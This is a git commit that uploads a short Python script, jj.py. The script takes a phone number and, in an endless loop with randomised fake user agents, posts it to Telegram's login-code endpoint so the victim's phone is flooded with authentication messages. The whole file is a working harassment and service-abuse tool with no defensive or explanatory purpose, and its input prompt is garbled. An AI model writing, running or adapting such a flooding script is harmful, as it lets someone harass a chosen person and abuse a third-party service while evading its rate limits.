8d670a0973b2ebc5dd77e1d450a9b684c9a45580
Hironotori <81866681+Hironotori@users.noreply.github.com>
2022-01-24 17:52:44 +0200

    Add files via upload

---
+++ jj.py
@@ -0,0 +1,16 @@
+import requests, fake_useragent, time
+
+user = fake_useragent.UserAgent().random
+headers = {'user_agent' : user}
+NUMBER = input('Beeante HOMep tenedona: (6es +)')
+
+
+
+while True:
+
+ try:
+     print('Отправлено')
+     response = requests.post('https://my.telegram.org/auth/send_password', headers=headers, json={'phone': "+" + NUMBER})
+ except:
+     print('Не доставлено')
+     time.sleep(1)
